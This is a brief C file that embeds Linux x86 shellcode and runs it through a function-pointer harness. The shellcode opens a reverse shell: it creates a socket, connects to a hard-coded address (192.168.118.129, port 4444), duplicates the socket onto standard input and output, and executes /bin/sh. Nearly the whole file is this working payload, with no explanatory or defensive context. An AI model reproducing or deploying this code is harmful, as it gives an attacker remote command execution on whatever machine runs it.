#include <stdio.h>
#include <string.h>

// Port number: 
#define PORT "\x11\x5c"
#define IP "\xc0\xa8\x76\x81"

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x0e\x6a\x04\x54\x6a\x02\x6a\x01\x56\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x31\xd2\xb0\x3f\x89\xf3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb0\x02\xcd\x80\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x03\x68"IP"\x66\x68"PORT"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
main()
{
	printf("Shellcode Length: %d\n",strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}